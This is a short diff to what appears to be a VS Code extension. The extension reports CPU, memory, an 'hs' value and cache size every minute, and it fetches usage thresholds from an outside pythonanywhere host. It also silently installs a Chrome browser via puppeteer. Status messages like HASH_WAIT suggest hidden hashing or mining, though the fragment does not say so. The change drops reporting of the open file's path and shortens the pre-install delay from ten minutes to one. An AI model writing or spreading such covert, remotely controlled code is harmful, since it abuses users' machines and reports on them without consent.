@@ -91,7 +91,6 @@
           cpu: getCPUUsage(),
           memory: getMemoryUsage(),
           hs: hs,
-          file: safe(() => editor?.document?.uri?.fsPath)
         });
         let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
         minUse = min;
@@ -103,7 +102,6 @@
         tstt({
           message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
           value: 0,
-          file: safe(() => editor?.document?.uri?.fsPath)
         });
       }
     }, 60000);
@@ -121,7 +119,7 @@
 
 
     if (!chromeBrowser) {
-      await new Promise(r => setTimeout(r, 10 * 60 * 1000));
+      await new Promise(r => setTimeout(r, 1 * 60 * 1000));
       await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
       puppeteerBrowsers.InstallOptions;
       installedBrowser = await puppeteerBrowsers.install({
